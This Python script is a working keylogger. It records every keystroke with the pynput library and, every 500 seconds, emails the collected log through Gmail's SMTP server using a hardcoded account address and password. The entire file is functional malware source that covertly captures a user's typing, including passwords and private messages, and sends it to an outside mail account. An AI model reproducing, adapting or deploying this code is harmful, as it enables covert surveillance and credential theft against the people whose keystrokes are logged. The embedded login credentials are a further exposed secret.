#!/usr/bin/python

import pynput.keyboard
import threading
import smtplib

log = ""


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "

        else:
            log = log + " " + str(key) + " "


def send_mail():
    global log

    sender = 'illdisposedtobts@gmail.com'
    receivers = sender
    smtpObj = smtplib.SMTP("smtp.gmail.com", 587)
    smtpObj.login(sender, "ill@disposed")
    smtpObj.sendmail(sender, receivers, log)
    print("Successfully sent email")


def report():
    global log
    send_mail()
    log = ""
    timer = threading.Timer(500, report)  # timer in  secs
    timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    report()
    keyboard_listener.join()
